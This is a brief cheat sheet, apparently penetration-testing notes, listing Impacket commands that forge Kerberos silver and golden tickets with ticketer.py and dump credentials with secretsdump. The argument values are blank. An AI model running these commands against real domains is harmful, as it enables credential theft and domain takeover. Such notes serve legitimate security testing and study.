# Impacket

# Generate Silver Tickets with Impacket:

- python3 ticketer.py -nthash
    
    -domain-sid  -domain  -spn 
    
- python3 ticketer.py -aesKey
    
    -domain-sid  -domain  -spn 
    

# Generate Golden Tickets:

- python3 ticketer.py -nthash
    
    -domain-sid  -domain 
    
- python3 ticketer.py -aesKey
    
    -domain-sid  -domain 
    

# Credential Access with Secretsdump

- impacket-secretsdump username@target-ip -dc-ip target-ip